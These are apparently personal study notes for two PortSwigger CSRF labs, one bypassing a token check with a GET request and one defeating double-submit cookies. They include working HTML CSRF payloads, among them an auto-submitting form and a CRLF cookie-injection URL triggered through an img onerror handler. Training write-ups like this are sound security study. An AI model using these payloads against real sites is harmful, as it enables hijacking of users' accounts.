
### Lab: [CSRF where token validation depends on request method](https://portswigger.net/web-security/csrf/lab-token-validation-depends-on-request-method)

	Description: This lab's email change functionality is vulnerable to CSRF. It attempts to block CSRF attacks, but only applies defenses to certain types of requests. 
	To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address. 
	You can log in to your own account using the following credentials: `wiener:peter`

Step 1: Check **csrf token** validate depends  on request method
Because this application's token validate depends on request method, we can attack CSRF with GET method to bypass the validation


Step 2: 
**Code to input on exploit server**
```
<form action="https://0a72001903f3cfa7c1009cc8005a0072.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="abcd&#64;testtest">
    <input type="submit" value="submit">
</form>
<script>
        document.forms[0].submit();
</script>
```

### Lab: [CSRF where token is duplicated in cookie](https://portswigger.net/web-security/csrf/lab-token-duplicated-in-cookie)

	Description: This lab's email change functionality is vulnerable to CSRF. It attempts to use the insecure "double submit" CSRF prevention technique.
	To solve the lab, use your exploit server to host an HTML page that uses a [CSRF attack](https://portswigger.net/web-security/csrf) to change the viewer's email address. You can log in to your own account using the following credentials: `wiener:peter`

Step 1: Get an overview of what the lab has to offer
We have a vulnerabitlity web application, an exploit server, a credential: '**wiener:peter**'

**Vunlnerability Web Applicataion**:
- Page **My account** to login/ if already logged, we can update email
- Page **Home**, can view blog and search blog
![](../../Img_note/Pasted%20image%2020221214043047.png)

**Exploit Server**
- Create a response, we will use this to attack **Cross-site request forgery**, we will put the payload in section body
![](../../Img_note/Pasted%20image%2020221214043150.png)

Step 2: Check the csrf token 
Login with `wiener:peter` and update an random email
When update email, the browser will sent this request to server. I sent this request to **Burp Repeater**
![](../../Img_note/Pasted%20image%2020221214050038.png)

I try to check the csrf token and observer if we change csrf token at the atributte **Cookies** and the parameter, we won't have to accept notification "Invalid CSRF token"
![](../../Img_note/Pasted%20image%2020221214050512.png)

But if we change only one value, we will get message "Invalid CSRF token"
=> parameter `csrf` is being validated by comparing with the `csrf` cookies. If cookis and csrf token had the same valuem, attacker didn't need a valid csrf token or cookie to implement the CSRF attack 
I observed the `Search` function on Home page, and see the application set value of **LastSearchTeam** is my search term => Don't have CSRF protection => Create malicious link with this request 

>https://0add00850420f6f8c1dfdeed007c0043.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=abchehe

The csrf at the Cookie will be set to abchehe

![](../../Img_note/Pasted%20image%2020221214052335.png)

Step 3: Create the payload
We will use POST method to get responses from malicious link to browser. After that we put malicious link to tag **img**
- add ==SameSite=None== on the malicious link, if **SameSite=Strict**, the browser will not include the cookie in any requests that originate from another site. [More](https://portswigger.net/web-security/csrf/samesite-cookies)
```
<html>
  <body>
    <form action="https://0add00850420f6f8c1dfdeed007c0043.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="csrf" value="abchehe" />
      <input type="hidden" name="email" value="abcd&#64;testtest" />
      <input type="submit" value="Submit request" />
    </form>
		<img src="https://0add00850420f6f8c1dfdeed007c0043.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=abchehe%3b%20SameSite=None" onerror="document.forms[0].submit();">
  </body>
</html>
```
Input the payload to section body
![](../../Img_note/Pasted%20image%2020221214044322.png)
Click **Store** to save and click **View exploit** to see the result: the email has been changed to **abcd@testtest**
![](../../Img_note/Pasted%20image%2020221214044236.png)
![](../../Img_note/Pasted%20image%2020221214045543.png)